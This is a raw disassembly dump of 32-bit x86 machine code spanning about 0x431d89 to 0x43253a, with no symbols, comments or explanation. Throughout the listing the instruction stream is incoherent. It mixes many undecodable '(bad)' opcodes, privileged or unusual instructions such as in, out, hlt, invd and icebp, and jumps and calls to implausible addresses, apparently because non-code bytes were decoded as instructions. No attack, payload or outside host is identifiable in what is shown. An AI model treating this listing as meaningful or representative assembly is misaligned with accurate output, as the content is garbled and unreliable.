  431d89:	mov    esp,esp
  431d8b:	clc    
  431d8c:	add    al,0x4d
  431d8e:	mov    DWORD PTR [ebx],esi
  431d90:	or     al,0x33
  431d92:	inc    ebp
  431d93:	lea    ecx,[ebx-0x398d13fd]
  431d99:	add    bh,al
  431d9b:	inc    ebp
  431d9c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431da3:	add    ebp,esp
  431da5:	shufps xmm1,xmm3,0xc7
  431da9:	(bad)  
  431daa:	jmp    0x748858d3
  431daf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431db5:	hlt    
  431db6:	mov    ecx,DWORD PTR [edi]
  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
